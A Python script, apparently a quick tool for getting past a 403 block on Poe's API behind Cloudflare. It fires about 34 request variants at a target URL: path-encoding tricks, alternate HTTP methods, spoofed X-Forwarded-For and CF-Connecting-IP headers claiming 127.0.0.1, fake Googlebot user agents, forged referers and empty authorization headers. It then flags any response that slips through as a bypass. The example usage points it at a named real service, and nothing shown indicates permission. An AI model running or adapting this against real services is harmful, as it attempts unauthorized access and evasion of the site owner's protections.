#!/usr/bin/env python3
"""
Quick 403 Bypass Test for Poe API
Testing specific techniques that might work against Cloudflare protection
"""

import requests
import time
import sys

def test_bypass_techniques(url):
    """Test various bypass techniques against the target URL"""
    
    print(f"🎯 Testing bypass techniques against: {url}")
    print("=" * 60)
    
    # Common bypass techniques to test
    techniques = [
        # Basic path variations
        ("Path with trailing slash", url + "/"),
        ("Path with double slash", url + "//"),
        ("Path with dot", url + "/."),
        ("Path with dot-slash", url + "/./"),
        ("Path with encoded slash", url + "/%2F"),
        ("Path with encoded dot", url + "/%2E"),
        
        # HTTP method variations
        ("OPTIONS method", url, {"method": "OPTIONS"}),
        ("HEAD method", url, {"method": "HEAD"}),
        ("POST method", url, {"method": "POST"}),
        ("PUT method", url, {"method": "PUT"}),
        ("PATCH method", url, {"method": "PATCH"}),
        
        # Header-based bypasses
        ("X-Forwarded-For localhost", url, {"headers": {"X-Forwarded-For": "127.0.0.1"}}),
        ("X-Real-IP localhost", url, {"headers": {"X-Real-IP": "127.0.0.1"}}),
        ("X-Originating-IP localhost", url, {"headers": {"X-Originating-IP": "127.0.0.1"}}),
        ("X-Remote-IP localhost", url, {"headers": {"X-Remote-IP": "127.0.0.1"}}),
        ("X-Client-IP localhost", url, {"headers": {"X-Client-IP": "127.0.0.1"}}),
        
        # Cloudflare specific
        ("CF-Connecting-IP", url, {"headers": {"CF-Connecting-IP": "127.0.0.1"}}),
        ("CF-IPCountry US", url, {"headers": {"CF-IPCountry": "US"}}),
        ("CF-Visitor", url, {"headers": {"CF-Visitor": '{"scheme":"https"}'}}),
        
        # User-Agent variations
        ("Googlebot User-Agent", url, {"headers": {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}),
        ("Bingbot User-Agent", url, {"headers": {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"}}),
        ("Mobile User-Agent", url, {"headers": {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"}}),
        
        # Accept header variations
        ("Accept JSON", url, {"headers": {"Accept": "application/json"}}),
        ("Accept XML", url, {"headers": {"Accept": "application/xml"}}),
        ("Accept All", url, {"headers": {"Accept": "*/*"}}),
        
        # Referer variations
        ("Referer same domain", url, {"headers": {"Referer": "https://poe.com/"}}),
        ("Referer Google", url, {"headers": {"Referer": "https://www.google.com/"}}),
        
        # Authorization attempts
        ("Basic Auth empty", url, {"headers": {"Authorization": "Basic "}}),
        ("Bearer token empty", url, {"headers": {"Authorization": "Bearer "}}),
        
        # Cache control
        ("No-Cache", url, {"headers": {"Cache-Control": "no-cache"}}),
        ("Pragma no-cache", url, {"headers": {"Pragma": "no-cache"}}),
        
        # Protocol variations
        ("HTTP/1.0", url, {"headers": {"Connection": "close"}}),
        
        # Content-Type variations for POST
        ("POST with JSON", url, {"method": "POST", "headers": {"Content-Type": "application/json"}, "data": "{}"}),
        ("POST with form data", url, {"method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "test=1"}),
    ]
    
    successful_bypasses = []
    
    for i, technique in enumerate(techniques, 1):
        technique_name = technique[0]
        test_url = technique[1]
        options = technique[2] if len(technique) > 2 else {}
        
        try:
            # Prepare request parameters
            method = options.get("method", "GET")
            headers = options.get("headers", {})
            data = options.get("data", None)
            
            # Add a reasonable timeout
            timeout = 10
            
            # Make the request
            if method == "GET":
                response = requests.get(test_url, headers=headers, timeout=timeout, allow_redirects=False)
            elif method == "POST":
                response = requests.post(test_url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
            elif method == "PUT":
                response = requests.put(test_url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
            elif method == "PATCH":
                response = requests.patch(test_url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
            elif method == "DELETE":
                response = requests.delete(test_url, headers=headers, timeout=timeout, allow_redirects=False)
            elif method == "HEAD":
                response = requests.head(test_url, headers=headers, timeout=timeout, allow_redirects=False)
            elif method == "OPTIONS":
                response = requests.options(test_url, headers=headers, timeout=timeout, allow_redirects=False)
            else:
                response = requests.get(test_url, headers=headers, timeout=timeout, allow_redirects=False)
            
            # Check response
            status_code = response.status_code
            content_length = len(response.content)
            
            # Determine if this might be a successful bypass
            if status_code in [200, 201, 202, 204]:
                status_color = "\033[92m"  # Green
                result = "SUCCESS"
                successful_bypasses.append((technique_name, status_code, content_length, test_url))
            elif status_code in [301, 302, 307, 308] and content_length > 100:
                status_color = "\033[93m"  # Yellow
                result = "REDIRECT"
                successful_bypasses.append((technique_name, status_code, content_length, test_url))
            elif status_code == 403:
                status_color = "\033[91m"  # Red
                result = "BLOCKED"
            elif status_code == 404:
                status_color = "\033[94m"  # Blue
                result = "NOT_FOUND"
            else:
                status_color = "\033[95m"  # Magenta
                result = "OTHER"
                if content_length > 1000:  # Large response might indicate success
                    successful_bypasses.append((technique_name, status_code, content_length, test_url))
            
            print(f"{status_color}[{i:2d}] {technique_name:<30} - {status_code} - {content_length:>5}b - {result}\033[0m")
            
            # Small delay to be respectful
            time.sleep(0.1)
            
        except requests.exceptions.RequestException as e:
            print(f"\033[91m[{i:2d}] {technique_name:<30} - ERROR: {str(e)}\033[0m")
        except Exception as e:
            print(f"\033[91m[{i:2d}] {technique_name:<30} - EXCEPTION: {str(e)}\033[0m")
    
    # Summary
    print("\n" + "=" * 60)
    print("🎯 BYPASS SUMMARY")
    print("=" * 60)
    
    if successful_bypasses:
        print(f"\033[92m✅ Found {len(successful_bypasses)} potential bypass(es):\033[0m")
        for i, (technique, status, length, url) in enumerate(successful_bypasses, 1):
            print(f"  {i}. {technique}")
            print(f"     Status: {status}, Length: {length}b")
            print(f"     URL: {url}")
            print()
    else:
        print("\033[91m❌ No successful bypasses found.\033[0m")
        print("The target appears to have robust protection in place.")
    
    return successful_bypasses

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 quick_bypass_test.py <url>")
        print("Example: python3 quick_bypass_test.py https://api.poe.com")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    test_bypass_techniques(target_url)